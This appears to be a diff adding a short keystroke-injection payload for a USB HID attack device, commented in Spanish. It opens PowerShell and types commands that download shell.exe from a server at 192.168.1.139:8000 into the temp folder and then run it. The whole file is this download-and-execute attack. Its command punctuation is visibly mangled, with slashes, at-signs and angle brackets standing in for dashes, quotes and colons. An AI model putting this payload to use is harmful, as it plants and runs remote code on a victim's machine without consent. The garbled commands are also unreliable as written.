@@ -1,0 +1,12 @@
+REM Descargar y ejecutar shell.exe desde servidor local
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 1000
+STRING Invoke/WebRequest /Uri @http>&&192.168.1.139>8000&shell.exe@ /OutFile @$env>TEMP&shell.exe@
+ENTER
+DELAY 1000
+STRING Start/Process @$env>TEMP&shell.exe@
+ENTER
